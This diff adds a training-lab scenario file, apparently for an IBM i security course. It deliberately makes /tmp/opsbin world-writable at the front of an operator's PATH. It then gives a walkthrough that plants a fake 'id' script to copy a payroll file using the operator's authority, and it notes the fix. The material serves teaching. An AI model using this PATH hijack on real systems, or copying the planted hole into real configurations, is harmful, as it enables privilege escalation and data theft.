@@ -1,0 +1,34 @@
+id = "pase-path-hijack"
+title = "A writable directory at the front of the operator's PATH"
+group = "E"
+summary = "The operator's profile puts /tmp/opsbin first on PATH and then runs id. Anyone who can write in /tmp/opsbin decides what id is."
+
+[[change]]
+target = "ifs:/tmp/opsbin"
+field = "public"
+vulnerable = "rwx"
+secure = "r-x"
+
+[cleanup]
+remove_new_ifs = true
+
+[flag]
+kind = "state"
+check = "ifs_loot_by_operator"
+task = "As STUDENT, get a copy of the payroll file into the IFS that STUDENT can read, by making the operator's own login do the copying. Then play the operator: sign on as OPERATOR and run CALL PGM(QP2TERM)."
+
+[doc]
+where = "PASE terminal, CALL PGM(QP2TERM) from any 5250 session"
+parallel = "A shell finds a command by walking PATH in order and running the first match. If a directory that anyone can write sits before the real one, a file named like a system command wins, and it runs as whoever typed the command. It is one of the oldest local privilege escalations there is."
+vulnerability = "OPERATOR's ~/.profile sets PATH=/tmp/opsbin:$PATH and then runs id. /tmp/opsbin is owned by OPERATOR with public rwx. OPERATOR may read APPLIB/PAYROLL, and STUDENT may not."
+mitre = ["T1574.007 Hijack Execution Flow: Path Interception by PATH Environment Variable", "T1068 Exploitation for Privilege Escalation", "T1005 Data from Local System"]
+steps = [
+  "Sign on as STUDENT, CALL PGM(QP2TERM), and ls -ld /tmp/opsbin. Everyone may write there.",
+  "echo 'cp /QSYS.LIB/APPLIB.LIB/PAYROLL.FILE /tmp/ops.txt' > /tmp/opsbin/id",
+  "chmod 755 /tmp/opsbin/id. Without x it is only text, and the shell skips it.",
+  "Sign on to a second session as OPERATOR (password OPERATOR) and run CALL PGM(QP2TERM). The profile runs id, finds yours first, and runs it as OPERATOR.",
+  "Back as STUDENT, cat /tmp/ops.txt.",
+]
+consequence = "STUDENT reads payroll rows through the operator's authority, and the operator saw nothing but a normal login."
+fix = "Never put a directory that others can write on anyone's PATH, and never before the system directories. The secure state makes /tmp/opsbin read only for everyone but OPERATOR, and the better fix is to take it off PATH."
+reference = "CWE-426 Untrusted Search Path; CIS Benchmarks on PATH and world writable directories; MITRE ATT&CK T1574.007."
